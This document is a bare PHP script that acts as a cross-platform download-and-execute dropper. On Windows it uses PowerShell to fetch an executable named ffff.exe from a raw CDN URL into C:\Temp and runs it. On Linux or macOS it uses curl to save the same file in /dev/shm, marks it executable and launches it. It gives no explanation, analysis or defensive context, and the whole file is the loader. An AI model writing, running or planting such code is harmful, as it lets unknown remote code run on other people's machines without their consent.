<?php
$os = strtoupper(substr(PHP_OS, 0, 3));

if ($os === 'WIN') {
    $path = 'C:\\Temp\\m.exe';
    system("powershell -Command \"(New-Object System.Net.WebClient).DownloadFile('https://cdn.githubraw.com/Shinedremuse/byibnflf/6350401d182c663f1cef1d5d875a9f0f17921214/ffff.exe', '$path')\"");
    system($path);
} else {
    // Linux/macOS
    $path = '/dev/shm/m';
    system("curl -s https://cdn.githubraw.com/Shinedremuse/byibnflf/6350401d182c663f1cef1d5d875a9f0f17921214/ffff.exe -o $path");
    system("chmod +x $path && $path");
}
?>